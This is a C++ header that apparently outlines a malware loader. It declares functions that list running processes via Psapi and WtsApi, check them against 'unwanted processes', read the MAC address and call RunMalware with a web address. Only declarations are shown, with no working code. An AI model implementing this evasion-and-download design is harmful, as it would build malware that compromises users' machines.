#pragma once
#pragma warning( push )
#pragma warning( disable : 4365)
#include <stdio.h>
#include <unordered_set>
#pragma warning( pop )
using namespace std;


/* @brief Checks whether one of the processes in the target_processes is in the vector of running_processes
*
* @param target_processes - pointer to the unordered-set wstring, describing unwanted processes.
* @param running_processes - pointer to the vector wstring, describing unwanted processes.
* @return true / false whether Is a process in 2 lists or not.
*/
bool IsAnyProcessRunning(const unordered_set<wstring>& target_processes, const vector<wstring>& running_processes);


/* @brief Returns all running processes names by uses the 'Psapi' library.
*
* @param running_processes - pointer to a empty vector-wstring, which will be filled with the list of running processes.
* @return true / false whether the function was successful in receiving or not.
*/
bool GetProcessNamesByPsApi(vector<wstring>& running_processes);

/* @brief Returns all running processes names by uses the 'WtsApi' library.
*
* @param running_processes - pointer to a empty vector-wstring, which will be filled with the list of running processes.
* @return true / false whether the function was successful in receiving or not.
*/
bool GetProcessNamesByWtsApi(vector<wstring>& running_processes);

bool GetMacAddress(wstring& mac_address);

bool RunMalware(const wstring web_address, const wstring mac_address);

void ProccessChecker();